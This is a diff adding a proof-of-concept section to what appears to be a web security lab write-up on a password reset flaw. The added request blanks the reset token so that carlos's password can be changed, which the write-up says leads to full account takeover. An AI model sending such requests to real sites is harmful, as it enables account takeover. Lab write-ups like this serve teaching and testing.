@@ -34,6 +34,18 @@ The password reset functionality fails to properly bind the final password-chang
 
 ### **Proof of Concept**
 
+```nix
+POST /forgot-password?temp-forgot-password-token= HTTP/2
+Host: <LAB_ID>.web-security-academy.net
+Cookie: session=<wiener_session>
+Content-Type: application/x-www-form-urlencoded
+
+temp-forgot-password-token=&username=carlos&new-password-1=password123&new-password-2=password123
+```
+
+**Result:** The server responds with 302 Found and successfully updates the password for the user carlos.
+
+Logging in with the credentials carlos:password123 grants full access to Carlos’s account, confirming complete account takeover.
 ## Root Cause
 
 ## Impact
